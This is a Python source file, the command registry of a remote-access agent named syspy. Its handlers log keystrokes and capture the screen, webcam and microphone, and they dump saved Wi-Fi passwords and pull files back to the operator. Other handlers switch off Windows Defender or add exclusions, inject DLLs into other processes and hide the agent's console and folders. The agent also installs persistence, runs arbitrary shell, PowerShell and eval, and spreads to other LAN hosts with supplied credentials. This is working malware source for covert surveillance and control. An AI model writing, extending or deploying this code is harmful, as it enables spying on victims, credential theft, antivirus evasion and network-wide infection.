"""The agent command registry.

Every command is a small function registered with :func:`command`.  Handlers
receive ``(agent, argument)`` and either return a string, or send structured
output themselves.

Unrecognised commands fall through to the shell, so ``ipconfig /all`` works
without being registered anywhere.
"""

from __future__ import annotations

import json
import os
import shlex
import shutil
import subprocess
import tempfile
import threading
import time
import traceback
from typing import Callable

from ..lan import discover as lan_discover
from .. import config, guardian, log

from . import (audio, camera, cloak, defender, files, inject, inputs, persistence,
               runtime, screen, stealth, sysinfo, system, updater)

def _split_args(text: str) -> list[str]:
    """Split a command line, keeping Windows backslashes intact.

    shlex.split() is POSIX mode and eats '\\', turning C:\\a\\b into C:ab.
    """
    parts: list[str] = []
    current: list[str] = []
    quote = ""
    for char in text:
        if quote:
            if char == quote:
                quote = ""
            else:
                current.append(char)
        elif char in "\"'":
            quote = char
        elif char.isspace():
            if current:
                parts.append("".join(current))
                current = []
        else:
            current.append(char)
    if current:
        parts.append("".join(current))
    return parts


Handler = Callable[["object", str], str | None]

REGISTRY: dict[str, Handler] = {}
ALIASES: dict[str, str] = {}

CREATE_NO_WINDOW = 0x08000000 if os.name == "nt" else 0


def command(*names: str) -> Callable[[Handler], Handler]:
    """Register a handler under one or more names."""
    def decorator(handler: Handler) -> Handler:
        REGISTRY[names[0]] = handler
        for alias in names[1:]:
            ALIASES[alias] = names[0]
        return handler
    return decorator


def resolve(name: str) -> Handler | None:
    """Look up a handler by name or alias."""
    key = name.lower()
    key = ALIASES.get(key, key)
    return REGISTRY.get(key)


def names() -> list[str]:
    """All registered command names, sorted."""
    return sorted(REGISTRY)


# --------------------------------------------------------------------------
# Identity and diagnostics
# --------------------------------------------------------------------------


@command("ping")
def cmd_ping(agent, argument: str) -> str:
    return "pong"


@command("ver", "version")
def cmd_version(agent, argument: str) -> str:
    from .. import __version__
    return (f"syspy {__version__}  sha {agent.self_sha}  pid {os.getpid()}\n"
            f"path {agent.bundle_entry}\n"
            f"python {sysinfo.summary()['python']}  admin {stealth.is_admin()}")


@command("info", "sysinfo", "sys")
def cmd_info(agent, argument: str) -> str:
    return sysinfo.text_report()


@command("where")
def cmd_where(agent, argument: str) -> str:
    lines = [f"pid      {os.getpid()}", f"running  {agent.bundle_entry}",
             f"root     {stealth.bundle_root()}"]
    for directory in stealth.install_directories():
        entry = os.path.join(directory, stealth.executable_name())
        lines.append(f"{'OK  ' if os.path.exists(entry) else 'MISS'} {entry}")
    return "\n".join(lines)


@command("elevate", "admin")
def cmd_elevate(agent, argument: str) -> str:
    if stealth.is_admin():
        return "agent is already running with full Administrator privileges"
    if stealth.elevate_process():
        return "elevation requested, awaiting UAC confirmation on target PC"
    return "elevation request failed or was blocked by Windows policy"


@command("stealth.info")
def cmd_stealth_info(agent, argument: str) -> str:
    data = stealth.description()
    return "\n".join(f"{key:12} {value}" for key, value in data.items())


@command("stealth.hide", "hide")
def cmd_hide(agent, argument: str) -> str:
    return stealth.hide_console()


@command("stealth.show", "show")
def cmd_show(agent, argument: str) -> str:
    return stealth.show_console()


@command("persist.status")
def cmd_persist_status(agent, argument: str) -> str:
    data = persistence.status()
    return "\n".join(f"{key:14} {value}" for key, value in data.items())


@command("persist.install")
def cmd_persist_install(agent, argument: str) -> str:
    return "\n".join(persistence.install()) or "nothing to do"


@command("persist.remove")
def cmd_persist_remove(agent, argument: str) -> str:
    return "\n".join(persistence.remove()) or "nothing removed"


@command("heal")
def cmd_heal(agent, argument: str) -> str:
    restored = persistence.install_copies()
    repaired = persistence.repair_from_kit()
    return ("restored " + str(len(restored)) + " copy(ies), "
            "repaired " + str(len(repaired)) + " file(s) from kit")


@command("defender.status", "av.status")
def cmd_defender_status(agent, argument: str) -> str:
    from . import defender
    return "\n".join(k.ljust(18) + " " + str(v) for k, v in defender.status().items())


# --------------------------------------------------------------------------
# Screen, camera, input
# --------------------------------------------------------------------------


@command("shot", "screenshot")
def cmd_screenshot(agent, argument: str) -> None:
    factor = 1
    try:
        percent = int((argument or "100").strip().rstrip("%"))
        factor = 4 if percent <= 25 else 2 if percent <= 50 else 1
    except ValueError:
        factor = 1
    data, message = screen.capture(factor)
    if data:
        agent.send_file("screenshot.png", data)
    else:
        agent.reply(message)


@command("burst")
def cmd_burst(agent, argument: str) -> None:
    try:
        count = int(argument or 5)
    except ValueError:
        count = 5
    for index, frame in enumerate(screen.capture_burst(count), start=1):
        agent.send_file(f"burst{index:02d}.png", frame)
    agent.reply(f"captured {count} frames")


@command("cam", "webcam")
def cmd_camera(agent, argument: str) -> None:
    data, message = camera.capture()
    if data:
        agent.send_file("webcam.jpg", data)
    else:
        agent.reply(message)


@command("key")
def cmd_key(agent, argument: str) -> str:
    action = (argument or "").strip().lower()
    log = agent.keylogger
    if action == "start":
        log.start()
        return "keylogger started" if log.running else "keylogger unavailable (non-Windows)"
    if action == "stop":
        log.stop()
        return "keylogger stopped"
    if action == "peek":
        # Was unreachable: "peek" sat in the draining branch, so peeking
        # destroyed the buffer.
        return log.snapshot() or "(nothing recorded yet)"
    if action in ("dump", "get"):
        text = log.drain()
        return text or "(nothing recorded yet)"
    if action == "clear":
        log.clear()
        return "cleared"
    return f"keylogger running: {log.running}  buffered: {len(log)}"


@command("type")
def cmd_type(agent, argument: str) -> str:
    return inputs.type_text(argument)


@command("mouse")
def cmd_mouse(agent, argument: str) -> str:
    parts = (argument or "").split()
    if not parts:
        return "usage: mouse <move|click|right|double|scroll|down|up|clickat|rightat> [x] [y] [n]"
    action = parts[0].lower()
    nums = [int(p) for p in parts[1:] if p.lstrip("-").isdigit()]
    x = nums[0] if len(nums) > 0 else None
    y = nums[1] if len(nums) > 1 else None

    table = {"clickat": "click", "rightat": "right", "dblat": "double", "moveat": "move"}
    if action in table:
        if x is None or y is None:
            return f"usage: mouse {action} <x> <y>"
        base = table[action]
        if base != "move":
            inputs.mouse(base, x, y)
            return f"{base} at {x},{y}"
        inputs.mouse_move(x, y)
        return f"moved to {x},{y}"

    if action in ("scroll", "wheel"):
        inputs.mouse_scroll(nums[0] if nums else 1)
        return f"scrolled {nums[0] if nums else 1}"
    if x is not None and y is not None:
        inputs.mouse(action, x, y)
    else:
        inputs.mouse(action)
    return f"mouse {action}"


@command("clip.get")
def cmd_clip_get(agent, argument: str) -> str:
    return inputs.clipboard_get()


@command("clip.set")
def cmd_clip_set(agent, argument: str) -> str:
    return inputs.clipboard_set(argument)


# --------------------------------------------------------------------------
# Filesystem (Windows File Explorer Backend)
# --------------------------------------------------------------------------


@command("fs.drives")
def cmd_drives(agent, argument: str) -> None:
    drives = files.list_drives()
    special = files.get_special_folders()
    agent.send_json({"kind": "drives", "drives": drives, "special_folders": special})


@command("fs.list", "ls", "dir")
def cmd_list(agent, argument: str) -> None:
    target = argument.strip().strip('"') if argument else ""
    listing = files.list_directory(target)
    agent.send_json({"kind": "listing", **listing})


@command("fs.prop", "fs.properties")
def cmd_properties(agent, argument: str) -> None:
    target = argument.strip().strip('"')
    props = files.get_properties(target)
    agent.send_json({"kind": "properties", **props})


@command("fs.read")
def cmd_read(agent, argument: str) -> None:
    target = argument.strip().strip('"')
    res = files.read_file_content(target)
    agent.send_json({"kind": "file_content", **res})


@command("fs.save")
def cmd_save(agent, argument: str) -> None:
    try:
        data = json.loads(argument)
        res = files.save_file_content(
            path=data["path"],
            content=data.get("content", ""),
            expected_sha=data.get("expected_sha", ""),
            encoding=data.get("encoding"),
            line_ending=data.get("line_ending"),
        )
    except Exception as err:
        res = {"success": False, "error": str(err)}
    agent.send_json({"kind": "save_result", **res})


@command("fs.touch")
def cmd_touch(agent, argument: str) -> None:
    path = argument.strip().strip('"')
    res = files.create_file(path)
    agent.send_json({"kind": "fs_op_result", "op": "touch", **res})


@command("fs.mkdir")
def cmd_mkdir(agent, argument: str) -> None:
    path = argument.strip().strip('"')
    res = files.create_directory(path)
    agent.send_json({"kind": "fs_op_result", "op": "mkdir", **res})


@command("fs.rename")
def cmd_rename(agent, argument: str) -> None:
    try:
        if argument.startswith("{"):
            data = json.loads(argument)
            old_path = data.get("old_path", "")
            new_name = data.get("new_name", "")
        else:
            old_path, _, new_name = argument.partition("|")
            if not new_name:
                old_path, _, new_name = argument.partition(" ")
            old_path = old_path.strip().strip('"')
            new_name = new_name.strip().strip('"')
        res = files.rename_item(old_path, new_name)
    except Exception as err:
        res = {"success": False, "error": str(err)}
    agent.send_json({"kind": "fs_op_result", "op": "rename", **res})


@command("fs.delete", "fs.rm", "rm")
def cmd_delete(agent, argument: str) -> None:
    permanent = False
    target = argument.strip()
    if target.startswith("{"):
        try:
            data = json.loads(target)
            path = data.get("path", "")
            permanent = bool(data.get("permanent", False))
        except Exception as err:
            agent.send_json({"kind": "fs_op_result", "op": "delete", "success": False, "error": str(err)})
            return
    else:
        if target.endswith(" --permanent"):
            permanent = True
            target = target[:-12].strip()
        path = target.strip('"')
    res = files.delete_item(path, permanent=permanent)
    agent.send_json({"kind": "fs_op_result", "op": "delete", **res})


@command("fs.cpmv")
def cmd_cpmv(agent, argument: str) -> None:
    try:
        data = json.loads(argument)
        res = files.copy_or_move(
            sources=data.get("sources", []),
            destination_dir=data.get("destination_dir", ""),
            is_move=bool(data.get("is_move", False)),
            conflict_resolution=data.get("conflict_resolution", "replace"),
        )
    except Exception as err:
        res = {"success": False, "error": str(err)}
    agent.send_json({"kind": "fs_op_result", "op": "cpmv", **res})


@command("fs.search")
def cmd_search(agent, argument: str) -> None:
    try:
        if argument.startswith("{"):
            data = json.loads(argument)
            root = data.get("root", "")
            query = data.get("query", "")
            match_case = bool(data.get("match_case", False))
            max_results = int(data.get("max_results", 250))
        else:
            root, _, query = argument.partition(" ")
            root = root.strip().strip('"')
            query = query.strip().strip('"')
            match_case = False
            max_results = 250
        res = files.search_filesystem(root, query, max_results=max_results, match_case=match_case)
    except Exception as err:
        res = {"success": False, "error": str(err)}
    agent.send_json({"kind": "search_results", **res})


@command("fs.cat", "cat")
def cmd_cat(agent, argument: str) -> str:
    if not argument:
        return "usage: cat <path>"
    return files.read_text(argument)


@command("fs.write")
def cmd_write(agent, argument: str) -> str:
    path, _, content = argument.partition(" ")
    if not path:
        return "usage: fs.write <path> <content>"
    return files.write_text(path, content)


@command("fs.find")
def cmd_find(agent, argument: str) -> str:
    root, _, pattern = argument.partition(" ")
    if not pattern:
        root, pattern = ".", argument
    return "\n".join(files.find(root or ".", pattern)) or "no matches"


@command("fs.download", "get")
def cmd_download(agent, argument: str) -> None:
    if not argument:
        agent.reply("usage: fs.download <path>")
        return
    path = os.path.expanduser(argument.strip().strip('"').strip("'"))
    if not os.path.exists(path):
        err = f"no such path: {path}"
        agent.reply(err)
        agent.send_json({"kind": "fs_op_result", "op": "download", "error": err})
        return
    display_name = os.path.basename(path)
    if not display_name:
        display_name = path.replace(":", "").replace("\\", "_").replace("/", "_").strip("_") or "folder"

    if os.path.isdir(path):
        archive_path = ""
        try:
            archive_path = files.prepare_zip_download(path)
            send_name = os.path.basename(archive_path)
            with open(archive_path, "rb") as handle:
                agent.send_file(send_name, handle.read())
            agent.reply(f"downloaded folder archive: {send_name}")
        except Exception as error:
            err = f"Archive creation failed: {error}"
            agent.reply(err)
            agent.send_json({"kind": "fs_op_result", "op": "download", "error": err})
        finally:
            if archive_path and os.path.exists(archive_path):
                try:
                    os.remove(archive_path)
                    parent_temp = os.path.dirname(archive_path)
                    if os.path.isdir(parent_temp) and "syspy" in parent_temp.lower():
                        shutil.rmtree(parent_temp, ignore_errors=True)
                except OSError:
                    pass
    else:
        try:
            with open(path, "rb") as handle:
                agent.send_file(display_name, handle.read())
            agent.reply(f"downloaded file: {display_name}")
        except Exception as error:
            err = f"Read failed: {error}"
            agent.reply(err)
            agent.send_json({"kind": "fs_op_result", "op": "download", "error": err})



@command("cd")
def cmd_cd(agent, argument: str) -> str:
    target = os.path.expanduser(argument or "~")
    if os.path.isdir(target):
        agent.cwd = os.path.abspath(target)
        return f"cwd -> {agent.cwd}"
    return "no such directory"


@command("pwd")
def cmd_pwd(agent, argument: str) -> str:
    return agent.cwd


# --------------------------------------------------------------------------
# System
# --------------------------------------------------------------------------


@command("proc.list", "ps")
def cmd_processes(agent, argument: str) -> None:
    agent.send_json({"kind": "processes", "items": sysinfo.processes()})


@command("proc.kill", "kill")
def cmd_kill(agent, argument: str) -> str:
    return system.kill_process(argument)


@command("proc.start", "start")
def cmd_start(agent, argument: str) -> str:
    return system.start_process(argument)


@command("net.info", "net")
def cmd_network(agent, argument: str) -> str:
    try:
        result = subprocess.run(
            "ipconfig /all" if os.name == "nt" else "ip address",
            shell=True, capture_output=True, timeout=30,
            creationflags=CREATE_NO_WINDOW,
        )
        return result.stdout.decode(errors="replace")
    except subprocess.TimeoutExpired:
        return "net.info timed out"
    except Exception as error:
        return f"net.info failed: {error}"


@command("net.wifi", "wifi")
def cmd_wifi(agent, argument: str) -> str:
    return sysinfo.wifi_passwords()


@command("power.lock", "lock")
def cmd_lock(agent, argument: str) -> str:
    return system.lock()


@command("power.shutdown", "shutdown")
def cmd_shutdown(agent, argument: str) -> str:
    return system.shutdown()


@command("power.restart", "restart")
def cmd_restart(agent, argument: str) -> str:
    return system.restart()


@command("power.sleep")
def cmd_sleep(agent, argument: str) -> str:
    return system.sleep()


@command("msg")
def cmd_message(agent, argument: str) -> str:
    return system.message(argument)


@command("beep")
def cmd_beep(agent, argument: str) -> str:
    return system.beep(argument)


@command("say")
def cmd_speak(agent, argument: str) -> str:
    return system.speak(argument)


@command("vol", "volume")
def cmd_volume(agent, argument: str) -> str:
    return system.volume(argument)


@command("wallpaper", "wall")
def cmd_wallpaper(agent, argument: str) -> str:
    return system.wallpaper(argument)


@command("open")
def cmd_open(agent, argument: str) -> str:
    return system.open_target(argument)


@command("installed")
def cmd_installed(agent, argument: str) -> str:
    return "\n".join(system.installed_programs()) or "none"


@command("startup")
def cmd_startup(agent, argument: str) -> str:
    return "\n".join(sysinfo.startup_entries()) or "none"


@command("reg.read")
def cmd_reg_read(agent, argument: str) -> str:
    return sysinfo.registry_read(argument)


@command("reg.write")
def cmd_reg_write(agent, argument: str) -> str:
    # Split at the last space so values containing spaces survive.
    if argument.startswith("{"):
        return sysinfo.registry_write(
            json.loads(argument).get("path", ""),
            json.loads(argument).get("value", ""))
    path, _, value = argument.rpartition(" ")
    return sysinfo.registry_write(path, value)


# --------------------------------------------------------------------------
# Lifecycle
# --------------------------------------------------------------------------


@command("update")
def cmd_update(agent, argument: str) -> str:
    return "ready, waiting for a pushed build"


@command("rollback")
def cmd_rollback(agent, argument: str) -> None:
    restored = updater.rollback()
    agent.reply(f"restored {restored} item(s), restarting")
    time.sleep(0.6)
    updater.restart_self()


@command("restart.agent")
def cmd_restart_agent(agent, argument: str) -> None:
    agent.reply("restarting")
    time.sleep(0.4)
    updater.restart_self()


@command("cmd")
def cmd_cmd(agent, argument: str) -> None:
    """Explicitly execute a command through the Windows Command Prompt."""
    if not argument:
        agent.reply("usage: cmd <command>")
        return
    shell(agent, argument)


@command("ps1", "powershell")
def cmd_powershell(agent, argument: str) -> None:
    """Execute a PowerShell command with execution policy bypass."""
    if not argument:
        agent.reply("usage: ps1 <powershell command or expression>")
        return
    handle, path = tempfile.mkstemp(prefix="wu-run-", suffix=".ps1")
    os.close(handle)
    try:
        with open(path, "w", encoding="utf-8") as handle:
            handle.write(argument)
        shell(agent, f'powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "{path}"')
    finally:
        try:
            if os.path.exists(path):
                os.remove(path)
        except OSError:
            pass


@command("proc.stop", "proc.killall")
def cmd_proc_stop(agent, argument: str) -> str:
    """Kill every shell/python child this agent started."""
    killed = 0
    for process in list(agent.processes):
        _kill_tree(process)
        killed += 1
        agent.processes.discard(process)
    return f"stopped {killed} child process(es)"


@command("py", "python")
def cmd_python(agent, argument: str) -> None:
    """Execute Python code or scripts using the agent's internal bundled interpreter.
    
    Guaranteed to run even if Python is not installed or not in system PATH.
    """
    if not argument:
        agent.reply(f"usage: py <code> or py <script.py> [interpreter: {runtime.interpreter()}]")
        return

    python_bin = runtime.interpreter()
    if python_bin.lower().endswith("pythonw.exe"):
        console = python_bin[: -len("pythonw.exe")] + "python.exe"
        if os.path.exists(console):
            python_bin = console   # pythonw has no stdout to capture
    trimmed = argument.strip()
    first_token, _, rest = trimmed.partition(" ")
    first_path = os.path.expanduser(first_token.strip('"'))

    if os.path.isfile(first_path):
        cmd = [python_bin, first_path] + (_split_args(rest) if rest else [])
    else:
        cmd = [python_bin, "-c", trimmed]

    try:
        process = subprocess.Popen(
            cmd, cwd=agent.cwd if os.path.isdir(agent.cwd) else None,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL,
            creationflags=CREATE_NO_WINDOW,
        )
        agent.processes.add(process)
        if process.stdout:
            for raw in iter(process.stdout.readline, b""):
                agent.reply(raw.decode(errors="replace").rstrip("\r\n"))
            process.stdout.close()
        process.wait()
        agent.reply(f"[exit {process.returncode}]")
        agent.processes.discard(process)
    except Exception:
        agent.reply(traceback.format_exc().strip().splitlines()[-1])


@command("eval")
def cmd_eval(agent, argument: str) -> str:
    namespace = agent.eval_namespace
    try:
        return repr(eval(argument, namespace))
    except Exception:
        try:
            exec(argument, namespace)
            return "ok"
        except Exception:
            return traceback.format_exc()


@command("log.tail")
def cmd_log_tail(agent, argument: str) -> str:
    try:
        count = int(argument or 200)
    except ValueError:
        count = 200
    return log.dump(count)


@command("log.level")
def cmd_log_level(agent, argument: str) -> str:
    return log.set_level(argument)


@command("log.clear")
def cmd_log_clear(agent, argument: str) -> str:
    return log.clear()


@command("log.counters")
def cmd_log_counters(agent, argument: str) -> str:
    import json as _json
    return _json.dumps(log.counters(), indent=1)


@command("install.report")
def cmd_install_report(agent, argument: str) -> str:
    path = os.path.join(stealth.primary_directory(), "install.log")
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as handle:
            return handle.read()[-8000:] or "(install.log empty)"
    except OSError:
        return "(no install.log)"


@command("help")
def cmd_help(agent, argument: str) -> str:
    return "commands: " + ", ".join(names())


@command("exit")
def cmd_exit(agent, argument: str) -> None:
    agent.reply("goodbye")
    threading.Thread(target=lambda: (time.sleep(0.3), agent.shutdown(0)),
                     daemon=True).start()


@command("deps.status")
def cmd_deps(agent, argument: str):
    from . import deps
    return deps.status()


@command("lan.state")
def cmd_lan_state(agent, argument: str):
    if not getattr(agent, "lan", None):
        return "lan disabled"
    return "beacon=%s peers=%s" % (bool(agent.lan), len(agent.lan.beacon.peers()) if agent.lan else 0)


@command("lan.scan")
def cmd_lan_scan(agent, argument: str):
    if not getattr(agent, "lan", None):
        return "lan disabled"
    records = lan_discover.discover(force=True)
    agent.send_json({"kind": "lan_scan", "hosts": list(records.values())})
    return f"{len(records)} hosts"


@command("lan.peers")
def cmd_lan_peers(agent, argument: str):
    if not getattr(agent, "lan", None):
        return "lan disabled"
    agent.send_json({"kind": "lan_peers", "peers": agent.lan.beacon.ask(1.5) if agent.lan else []})


@command("lan.pull")
def cmd_lan_pull(agent, argument: str):
    if not getattr(agent, "lan", None):
        return "lan disabled"
    return str(agent.spreader.pull_from_peer({"ip": argument.strip()}))


@command("lan.push")
def cmd_lan_push(agent, argument: str):
    if not getattr(agent, "lan", None):
        return "lan disabled"
    parts = argument.split()
    ip = parts[0] if parts else ""
    user = parts[1] if len(parts) > 1 else ""
    password = parts[2] if len(parts) > 2 else ""
    domain = parts[3] if len(parts) > 3 else ""
    agent.send_json({"kind": "lan_push", "result":
                     agent.spreader.push_host(ip, user, password, domain, verify=True)})


@command("lan.spread")
def cmd_lan_spread(agent, argument: str):
    if not getattr(agent, "lan", None):
        return "lan disabled"
    parts = argument.split()
    user = parts[0] if parts else ""
    password = parts[1] if len(parts) > 1 else ""
    domain = parts[2] if len(parts) > 2 else ""
    agent.send_json({"kind": "lan_spread", "result":
                     agent.spreader.scan_and_push(user, password, domain)})


@command("lan.refresh")
def cmd_lan_refresh(agent, argument: str):
    if not getattr(agent, "lan", None):
        return "lan disabled"
    agent.send_json({"kind": "lan_refresh", "result": agent.spreader.refresh_all()})


@command("guardian.status")
def cmd_guardian(agent, argument: str):
    """Reports status of WMI consumer, shim, and startup approval."""
    return "\n".join(f"{k:16} {v}" for k, v in guardian.status(mutate=True).items())


@command("guardian.install")
def cmd_guardian_install(agent, argument: str):
    return "\n".join(guardian.install()) or "nothing to do"


@command("persist.report")
def cmd_persist_report(agent, argument: str):
    """Declare every vector and every machine-wide change we made."""
    import json as _json
    from . import persistence
    return _json.dumps(persistence.report(), indent=1, default=str)


@command("state.show")
def cmd_state_show(agent, argument: str):
    import json as _json
    from . import machine_state
    return _json.dumps(machine_state.load(), indent=1, default=str)


@command("state.forget")
def cmd_state_forget(agent, argument: str):
    from . import machine_state
    machine_state.forget(argument.strip())
    return f"forgot {argument.strip() or 'everything'}"


@command("session")
def cmd_session(agent, argument: str):
    from . import session
    return (f"session     {session.current_session()}\n"
            f"headless    {session.is_headless()}\n"
            f"console     {session.console_session()}\n"
            f"console user {session.console_user() or '(none)'}")


@command("stop")
def cmd_stop(agent, argument: str) -> None:
    """Kill the agent but keep every autostart vector."""
    agent.reply("stopping (vectors kept)")
    threading.Thread(target=lambda: (time.sleep(0.4), agent.shutdown(0)),
                     daemon=True).start()


@command("purge")
def cmd_purge(agent, argument: str):
    agent.reply("purging...")
    threading.Thread(target=lambda: (time.sleep(0.5), persistence.purge(),
                                     agent.shutdown(0)), daemon=True).start()


@command("uninstall", "self_destruct")
def cmd_uninstall(agent, argument: str) -> None:
    """Completely remove all persistence mechanisms and shut down."""
    agent.reply("uninstalling agent and removing persistence...")
    try:
        agent.send({"t": "bye"})
    except Exception:
        pass

    def _do_remove():
        time.sleep(0.5)
        from .. import config
        persistence.remove(keep_anchor=config.protected())
        agent.shutdown(0)

    import threading
    threading.Thread(target=_do_remove, daemon=True).start()


# --------------------------------------------------------------------------
# Fallback
# --------------------------------------------------------------------------


def _kill_tree(process) -> None:
    """Kill a process and its children."""
    try:
        if os.name == "nt":
            subprocess.run(["taskkill", "/F", "/T", "/PID", str(process.pid)],
                           capture_output=True, timeout=10,
                           creationflags=CREATE_NO_WINDOW)
        else:
            process.kill()
    except Exception:
        pass


def shell(agent, command: str, timeout: float = 0) -> None:
    """Run ``command`` through the system shell and stream the output.

    Now bounded: an un-timed-out ``ping -t`` used to hold a thread and a pipe
    for the life of the process, with no way to stop it from the dashboard.
    """
    timeout = timeout or config.SHELL_TIMEOUT
    log.get("commands").info("shell: %s", command[:200])
    try:
        process = subprocess.Popen(
            command, shell=True, cwd=agent.cwd if os.path.isdir(agent.cwd) else None,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL,
            creationflags=CREATE_NO_WINDOW,
        )
        agent.processes.add(process)
        deadline = time.time() + timeout if timeout else 0
        timed_out = False
        if process.stdout:
            for raw in iter(process.stdout.readline, b""):
                agent.reply(raw.decode(errors="replace").rstrip("\r\n"))
                if deadline and time.time() > deadline:
                    timed_out = True
                    _kill_tree(process)
                    break
            try:
                process.stdout.close()
            except Exception:
                pass
        process.wait()
        agent.reply(f"[timeout after {int(timeout)}s - killed]" if timed_out
                    else f"[exit {process.returncode}]")
        agent.processes.discard(process)
    except Exception as error:
        log.get("commands").warning("shell failed: %s", error, exc_info=True)
        agent.reply(traceback.format_exc().strip().splitlines()[-1])




# --------------------------------------------------------------------------
# Optional modules (audio, defender, inject, cloak)
# --------------------------------------------------------------------------


@command("mic", "record")
def cmd_mic(agent, argument: str) -> str:
    secs = 5
    if argument.strip().isdigit():
        secs = max(1, min(60, int(argument.strip())))
    out = audio.record_clip(seconds=secs)
    if out.startswith("error:"):
        return out
    if os.path.isfile(out):
        agent.send_file(out)
        return f"recorded {secs}s audio: {os.path.basename(out)}"
    return "audio recording failed"


@command("defender")
def cmd_defender(agent, argument: str) -> str:
    arg = argument.strip()
    if not arg:
        return "usage: defender <off | on | status | exclude <path_or_process>>"
    parts = arg.split(maxsplit=1)
    sub = parts[0].lower()
    if sub in ("on", "enable", "restore"):
        return ("defender realtime monitoring restored" if defender.enable_monitoring()
                else "failed to re-enable defender")
    if sub == "status":
        return "\n".join(f"{k:18} {v}" for k, v in defender.status().items())
    if sub in ("off", "disable"):
        ok = defender.disable_monitoring()
        return "defender realtime monitoring disabled" if ok else "failed to disable defender"
    if sub in ("exclude", "add"):
        if len(parts) < 2:
            return "usage: defender exclude <path_or_process>"
        target = parts[1].strip("'\"")
        ok = defender.add_exclusion(target)
        return f"exclusion added for {target}" if ok else f"failed to add exclusion for {target}"
    return "usage: defender <disable | exclude <path_or_process>>"


@command("inject")
def cmd_inject(agent, argument: str) -> str:
    parts = _split_args(argument)
    if len(parts) < 2:
        return "usage: inject <pid> <dll_path>"
    try:
        pid = int(parts[0])
    except ValueError:
        return "invalid pid"
    dll_path = parts[1]
    if not os.path.isfile(dll_path):
        return f"file not found: {dll_path}"
    ok = inject.inject_dll(pid, dll_path)
    return f"injected {dll_path} into PID {pid}" if ok else f"injection into PID {pid} failed"


@command("cloak")
def cmd_cloak(agent, argument: str) -> str:
    path = argument.strip("'\" ")
    if not path:
        count = cloak.cloak_install_directories()
        return f"cloaked install directories ({count} items)"
    if os.path.isdir(path):
        selective = os.path.basename(os.path.abspath(path)).lower() == "edgeupdate"
        count = cloak.cloak_tree(path, selective=selective)
        return f"cloaked directory {path} ({count} items)"
    elif os.path.isfile(path):
        ok = cloak.cloak_path(path)
        return f"cloaked file {path}" if ok else f"failed to cloak {path}"
    return f"path not found: {path}"
def execute(agent, line: str) -> None:
    """Dispatch one command line."""
    line = line.strip()
    if not line:
        return
    name, _, argument = line.partition(" ")

    # "!" forces the shell. An unknown bare word is now reported instead of
    # being executed, so a typo no longer looks like a working command.
    if name.startswith("!"):
        shell(agent, line[1:].strip())
        return

    handler = resolve(name)
    if handler is None:
        if " " not in line and "." not in name:
            agent.reply(f"unknown command: {name}  (use !{name} for the shell)")
            return
        shell(agent, line)
        return
    if hasattr(agent, "health") and agent.health:
        agent.health.mark_command(line)
    try:
        result = handler(agent, argument.strip())
        if isinstance(result, str) and result:
            agent.reply(result)
    except Exception:
        err_msg = traceback.format_exc().strip().splitlines()[-1]
        log.get("commands").error("command %r failed: %s", name, err_msg, exc_info=True)
        if hasattr(agent, "health") and agent.health:
            agent.health.mark_error(err_msg)
        agent.reply(err_msg)
